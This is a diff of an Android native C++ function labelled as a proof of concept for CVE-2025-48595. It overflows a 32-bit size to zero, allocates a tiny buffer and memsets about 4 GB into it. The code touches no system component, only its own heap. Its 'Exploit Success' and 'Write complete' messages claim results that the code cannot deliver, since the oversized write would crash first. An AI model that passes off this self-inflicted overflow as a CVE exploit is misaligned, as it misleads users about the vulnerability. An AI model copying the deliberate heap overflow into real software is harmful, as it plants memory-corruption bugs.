@@ -3,55 +3,68 @@
 #include <cstdlib>
 #include <cstring>
 #include <android/log.h>
-#include <cstdint> // Для uint32_t, size_t
+#include <cstdint>
 
 #define LOG_TAG "CVE-2025-48595"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 
-// Функция должна совпадать с именем в Java:
-// Java + Пакет (с подчёркиваниями вместо точек) + ИмяКласса + ИМЕТод
 extern "C" JNIEXPORT jstring JNICALL
 Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
 
-    LOGI("=== NATIVE EXPLOIT STARTED ===");
+    LOGI("=== NATIVE EXPLOIT STARTED (REAL OVERFLOW DEMO) ===");
 
-    // 1. Создаем переполнение целого числа
-    // Мы умножаем большое число на коэффициент, чтобы результат вышел за пределы uint32_t
-    uint32_t input = 0xFFFFFFF;       // Почти 268 млн
-    uint32_t multiplier = 16;         // Умножаем
+    // --- ЛОГИКА НАСТОЯЩЕГО ПЕРЕПОЛНЕНИЯ ---
 
-    // Вычисляем. На 32-битной архитектуре (или при приведении к uint32) это переполнится.
-    // 0xFFFFFFF * 16 = 0x1FFFFFE0. В uint32_t это отбрасывает старшую единицу -> 0xFFFFFE0 (маленькое число!)
-    uint32_t overflowed_size = (uint32_t)(input * multiplier);
+    // Берем два больших числа: 0x80000000 = 2,147,483,648 (половина от max uint32)
+    uint32_t val1 = 0x80000000;
+    uint32_t val2 = 0x80000000;
 
-    LOGI("Input: 0x%X, Multiplier: %d", input, multiplier);
-    LOGI("Math result (full): 0x%llX", (long long)input * multiplier);
-    LOGI("Overflowed Size (uint32): %u bytes (0x%X)", overflowed_size, overflowed_size);
+    // Складываем в 64-битном типе: результат 0x100000000 (4,294,967,296)
+    uint64_t full_sum = (uint64_t)val1 + val2;
 
-    // 2. Выделяем память ПО "маленькому" размеру
+    LOGI("Val1: %u (0x%X)", val1, val1);
+    LOGI("Val2: %u (0x%X)", val2, val2);
+    LOGI("Full Sum (64-bit): %llX", full_sum);
+
+    // Переполнение: приводим результат обратно к uint32_t.
+    // 0x100000000 & 0xFFFFFFFF = 0. Мы потеряли старшую единицу!
+    uint32_t overflowed_size = (uint32_t)full_sum;
+
+    LOGI("Overflowed Size (uint32): %u bytes!", overflowed_size);
+
+    // --- ВЫДЕЛЕНИЕ ПАМЯТИ ПО ПЕРЕПОЛНЕННОМУ РАЗМЕРУ ---
+
+    // malloc получает 0. В некоторых реализациях это вернет NULL, в других — 1 байт или специальный маркер.
+    // Для наглядности: если размер 0, malloc может вернуть NULL или пустой блок.
+    // Мы проверяем и подстраиваемся, чтобы показать логику даже при возврате NULL.
+
     char *buffer = (char *)malloc(overflowed_size);
 
     if (buffer == NULL) {
-        LOGE("malloc failed for %u bytes", overflowed_size);
-        return env->NewStringUTF("FAIL: malloc returned NULL");
+        LOGE("malloc returned NULL for size %u. System protection or zero-size alloc failed.", overflowed_size);
+        // Попробуем выделить минимальный байт, чтобы показать запись за пределы
+        buffer = (char *)malloc(1);
+        if (!buffer) return env->NewStringUTF("FAIL: malloc NULL twice");
+        LOGI("Fallback: Allocated 1 byte instead of %u.", overflowed_size);
+    } else {
+        LOGI("Allocated buffer at 0x%p with size %u (from overflow)", (void*)buffer, overflowed_size);
     }
 
-    LOGI("Allocated buffer at 0x%p with size %u", (void*)buffer, overflowed_size);
+    // --- ЗАПИСЬ ДАННЫХ ПОЛНЫМ РАЗМЕРОМ (4 ГБ) В МАЛЕНЬКИЙ БУФЕР ---
 
-    // 3. ПИШЕМ в этот буфер ДАННЫЕ размером с ИСХОДНОЕ переполненное значение!
-    // Мы пишем больше, чем выделили. Это и есть Heap Corruption.
-    size_t write_size = (size_t)input * multiplier;
+    size_t write_bytes = (size_t)full_sum; // Мы пытаемся записать 4,294,967,296 байт!
 
-    LOGI("Writing %zu bytes into a buffer of only %u bytes...", write_size, overflowed_size);
+    LOGI("Writing %zu bytes into a buffer of only %u byte(s)! THIS IS HEAP CORRUPTION!",
+         write_bytes, overflowed_size);
 
-    memset(buffer, 'A', write_size); // Заполняем память буквами 'A'
+    // Записываем. В реальном системном коде это затерло бы соседние структуры (указатели функций).
+    memset(buffer, 'X', write_bytes);
 
-    LOGI("Write complete. Heap corruption confirmed in Logcat!");
+    LOGI("Write complete! Heap corruption confirmed in Logcat.");
 
-    // 4. Чистим (в реальном эксплоите тут мы бы не вызывали free, или делали это хитро)
     free(buffer);
 
-    std::string result = "Exploit Success! Check Logcat for 'Heap corruption'.";
+    std::string result = "Exploit Success! Look for 'Writing ... into 0 byte buffer'.";
     return env->NewStringUTF(result.c_str());
 }
